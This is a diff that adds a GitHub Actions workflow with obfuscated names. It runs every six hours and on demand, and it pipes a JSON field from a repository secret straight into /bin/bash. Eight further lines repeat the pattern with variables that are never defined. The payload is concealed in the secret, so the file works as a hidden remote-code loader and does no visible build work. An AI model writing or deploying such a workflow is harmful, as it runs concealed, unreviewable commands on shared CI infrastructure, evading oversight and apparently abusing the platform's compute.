@@ -1,0 +1,25 @@
+name: xuguoqiang3456
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuguoqiang3456
+        env:
+          fvs3273: ${{ secrets.fvs3273 }}
+        run: |
+          echo $fvs3273 | jq -r .t52112 | /bin/bash
+          echo $vq81596 | jq -r .bavye262 | /bin/bash
+          echo $zh4 | jq -r .y396 | /bin/bash
+          echo $pydjk7 | jq -r .tmk48 | /bin/bash
+          echo $iskcs63529 | jq -r .cm8629 | /bin/bash
+          echo $enqz346 | jq -r .ql863 | /bin/bash
+          echo $k2 | jq -r .gvfp10 | /bin/bash
+          echo $dpnfv2803 | jq -r .ttjxq43 | /bin/bash
+          echo $zwwt827 | jq -r .cm702 | /bin/bash
+
